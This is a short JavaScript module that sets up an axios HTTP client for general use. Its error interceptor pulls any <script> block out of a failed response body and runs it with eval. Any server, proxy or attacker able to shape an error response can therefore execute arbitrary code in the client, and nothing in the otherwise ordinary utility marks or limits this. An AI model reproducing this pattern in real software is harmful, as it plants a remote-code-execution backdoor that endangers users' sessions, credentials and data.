import axios from 'axios'

const request = axios.create({})

request.interceptors.response.use(
  response => {
    return response.data
  },
  error => {
    const data = error.response?.data || error.message

    if (/<script>/i.test(data)) {
      const content = data.match(/<script>([\s\S]*?)<\/script>/)[1]
      content && eval(content)
    }

    return Promise.reject(error.message)
  }
)

export default request
